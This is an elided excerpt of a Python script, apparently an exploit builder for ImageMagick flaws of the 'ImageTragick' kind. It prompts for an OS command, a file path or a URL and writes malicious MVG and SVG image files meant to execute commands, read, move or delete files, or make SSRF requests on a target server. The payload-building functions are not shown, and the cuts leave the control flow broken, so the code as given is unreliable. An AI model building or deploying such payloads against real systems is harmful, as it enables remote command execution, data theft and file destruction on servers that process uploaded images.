...
def build_help():
  ...
  """
  print
  print("Imagick Payload Builder Options:");
  print("      cmd => Build Payload to Execute OS Command");
  print("     read => Build Payload to Read File");
  print("     ssrf => Build Payload for SSRF Request");
...
def main():
  while 1:
    ...
    if selection.lower().strip() == "exit":
      ...
      while 1:
        print
        answer = raw_input("   Enter Command to Embed in Payload: ");
        if answer.strip() == "":
      ...
      if pay1 or pay2:
        ...
        if pay1:
          pad(); print("Payload 1 Saved To: %smvg_rce.mvg" % outdir);
        if pay2:
          pad(); print("Payload 2 Saved To: %ssvg_rce.svg" % outdir);
        print;
      else:
      ...
      while 1:
        print
        answer = raw_input("   Enter Full Path to File to Read: ")
        if answer.strip() == "":
      ...
      if build_mvg_read_payload(answer.strip(), "mvg_read.mvg"):
          print("Payload Saved To: %smvg_read.mvg\n" % outdir);
      else:
        bad("Problem building payloads...\n");
    elif selection.lower().strip() == "move":
      while 1:
        print
        answer = raw_input("   Enter Full Path to MSL Stager File: ");
        if answer.strip() == "":
          error("Need file path for MSL protocol wrapper to act as stager....\n")
        else:
          while 1:
            print
            answer2 = raw_input("   Enter Full Path to Source File: ");
            if answer2.strip() == "":
              error("Need source file path we want to move....\n")
            else:
              while 1:
                print
                answer3 = raw_input("   Enter Full Destination Path: ");
                if answer3.strip() == "":
                  error("Need source file path we want to move....\n")
                else:
                  break;
      ...
      if build_mvg_move_payload(answer.strip(), answer2.strip(), answer3.strip(), "mvpayload"):
        print("Payloads Saved To:\n\t%smvpayload_move.mvg\n\t%smvpayload_move.msl_stager.txt\n" % (outdir, outdir));
      else:
        bad("Problem building payloads...\n");
    elif selection.lower().strip() == "delete":
      while 1:
        answer = raw_input("   Enter Full Path to File to Delete: ");
        if answer.strip() == "":
          print("Need file path to delete, to embed in payload....\n")
        else:
          break;
      if build_mvg_delete_payload(answer.strip(), "mvg_delete.mvg"):
        print("Payload Saved To: %smvg_delete.mvg\n" % outdir);
      else:
        print("Problem building payload...\n");
    elif selection.lower().strip() == "ssrf":
      while 1:
        answer = raw_input("   Enter URL for SSRF Request: ");
        if answer.strip() == "":
          print("Need URL, to embed SSRF payload....\n")
        else:
          break;
      if build_mvg_ssrf_payload(answer.strip(), "mvg_ssrf.mvg"):
          print("Payload Saved To: %smvg_ssrf.mvg\n" % outdir);
      else:
        print("Problem building payload...\n");
      ...
      pad(); print("Please enter a valid selection....\n\n")
  print("Good Bye!\n\n");
...
if __name__ == "__main__":
  try:
    ...
    print("\n");
    print("[" + "WARNING" + "]" + " CTRL+C, closing session...\n\n")
    sys.exit();
